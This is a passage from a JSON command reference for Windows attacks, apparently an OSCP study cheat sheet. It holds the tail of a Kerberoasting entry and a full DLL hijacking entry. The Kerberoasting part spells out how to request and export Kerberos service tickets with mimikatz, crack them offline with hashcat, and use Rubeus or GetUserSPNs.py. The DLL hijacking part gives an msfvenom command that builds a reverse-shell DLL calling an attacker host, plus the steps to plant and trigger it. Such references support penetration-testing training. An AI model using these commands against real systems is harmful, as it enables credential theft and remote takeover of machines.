        "HTTP service accounts"
      ],
      "failure_indicators": [
        "No SPNs found",
        "Not domain joined",
        "Access denied"
      ],
      "next_steps": [
        "Request tickets: Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList '<SPN>'",
        "Export tickets: mimikatz kerberos::list /export",
        "Crack offline: hashcat -m 13100 ticket.kirbi wordlist.txt",
        "Use Rubeus: Rubeus.exe kerberoast"
      ],
      "alternatives": ["GetUserSPNs.py <domain>/<user>:<pass>", "Rubeus.exe kerberoast"],
      "notes": "Service account passwords often weak",
      "oscp_relevance": "high"
    },
    {
      "id": "windows-dll-hijacking",
      "name": "DLL Hijacking Check",
      "category": "post-exploit",
      "command": "echo %PATH% & where /r C:\\ *.dll 2>nul | findstr /i /c:\"program files\"",
      "description": "Find potential DLL hijacking opportunities",
      "tags": ["WINDOWS", "PRIVESC", "OSCP:MEDIUM"],
      "variables": [],
      "flag_explanations": {
        "%PATH%": "System PATH variable",
        "where /r": "Recursive file search",
        "*.dll": "Search for DLL files"
      },
      "success_indicators": [
        "Writable directories in PATH",
        "Missing DLLs in procmon",
        "DLL search order issues"
      ],
      "failure_indicators": [
        "No writable directories",
        "All DLLs present",
        "Secure PATH"
      ],
      "next_steps": [
        "Monitor with Procmon: NAME NOT FOUND for DLLs",
        "Create malicious DLL: msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> -f dll > hijack.dll",
        "Place in writable PATH directory",
        "Trigger vulnerable application"
      ],
      "alternatives": ["icacls C:\\Progra~1\\*", "dir /s /b C:\\*.dll 2>nul"],
      "notes": "Common with third-party applications",
      "oscp_relevance": "medium"
    }
  ]
}